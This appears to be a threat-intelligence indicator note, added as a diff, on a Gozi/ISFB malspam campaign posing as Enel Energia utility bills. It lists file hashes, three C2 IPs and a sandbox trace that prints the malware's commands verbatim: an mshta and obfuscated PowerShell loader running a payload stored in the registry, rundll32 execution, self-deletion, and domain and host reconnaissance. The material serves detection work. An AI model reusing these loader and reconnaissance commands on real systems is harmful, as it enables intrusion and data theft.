@@ -1,0 +1,136 @@
+05.04.2022 | Gozi_ifsb | 3000 | 
+
+******************************
+
+Sender: noreply.enelenergia@enel.com
+Subject: ENELENERGIA - EMISSIONE BOLLETTAWEB DI ENERGIA ELETTRICA DI 2022-04-05
+
+******************************
+
+.xls e12128d9edb9798aaf85e9af94c1b1c54d42ee671b0c204daa1e68ab8a3cf0d6
+.dll 9f1726bcf904de21195baee12c9e794e72aa7af04e891cd6733ea7520650195b
+
+******************************
+
+Exec >>
+
+EXCEL.EXE /dde C:\Users\Admin\AppData\Local\Temp\001208932585_4.xlsm
+
+regsvr32 -s C:\Users\Admin\AppData\Local\Temp\4137
+
+C:\Windows\System32\RuntimeBroker.exe -Embedding
+
+C:\Windows\Explorer.EXE
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\4012335e3ecc0513c7097c8b7e4529a3.dll,#1
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\4012335e3ecc0513c7097c8b7e4529a3.dll,#1
+
+mshta.exe" "about:<hta:application><script>Xert='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Xert).regread('HKCU\\\Software\\AppDataLow\\Software\\Microsoft\\1FA1BA31-F27B-A9AA-F4C3-46ED68A7DA71\\\ListMelody'));if(!window.flag)close()</script>"
+
+powershell.exe" new-alias -name jrgrpce -value gp; new-alias -name fptdegwj -value iex; fptdegwj ([System.Text.Encoding]::ASCII.GetString((jrgrpce "HKCU:Software\AppDataLow\Software\Microsoft\1FA1BA31-F27B-A9AA-F4C3-46ED68A7DA71").PlayFile))
+
+
+csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\hfrxq4hp\hfrxq4hp.cmdline"
+
+cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RES875E.tmp" "c:\Users\Admin\AppData\Local\Temp\hfrxq4hp\CSC86BD7D25ECFF42C4ACB57EE4D2CBF182.TMP"
+
+csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\vcwdijdr\vcwdijdr.cmdline"
+
+cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RES8829.tmp" "c:\Users\Admin\AppData\Local\Temp\vcwdijdr\CSC78BFE85599944AD0B232AF1A7088A61.TMP"
+
+cmd.exe" /C ping localhost -n 5 && del "C:\Users\Admin\AppData\Local\Temp\4012335e3ecc0513c7097c8b7e4529a3.dll"
+
+ping  localhost -n 5 
+
+cmd /C "nslookup myip.opendns.com resolver1.opendns.com > C:\Users\Admin\AppData\Local\Temp\3A5C.bi1"
+
+nslookup  myip.opendns.com resolver1.opendns.com 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\3A5C.bi1"
+
+cmd /C "systeminfo.exe > C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+systeminfo.exe  
+
+WinMail.exe "C:\Program Files\Windows Mail\WinMail" OCInstallUserConfigOE
+
+cmd.exe" /C pause dll mail, , 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "net view >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+net  view 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "nslookup 127.0.0.1 >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+nslookup  127.0.0.1 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "tasklist.exe /SVC >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+tasklist.exe  /SVC 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "driverquery.exe >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+driverquery.exe  
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+reg.exe  query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "net config workstation >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+net  config workstation 
+
+net1  config workstation 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "nltest /domain_trusts >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+nltest  /domain_trusts 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "nltest /domain_trusts /all_trusts >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+nltest  /domain_trusts /all_trusts 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "net view /all /domain >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+net  view /all /domain 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /C "net view /all >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+net  view /all 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+cmd /U /C "type C:\Users\Admin\AppData\Local\Temp\EA17.bin1 > C:\Users\Admin\AppData\Local\Temp\EA17.bin & del C:\Users\Admin\AppData\Local\Temp\EA17.bin1"
+
+*************************************************
+
+https://tria.ge/220405-r5ab7sghd5
+
+*************************************************
+
+c2's
+
+185.154.53.214
+185.154.53.188
+46.30.42.246
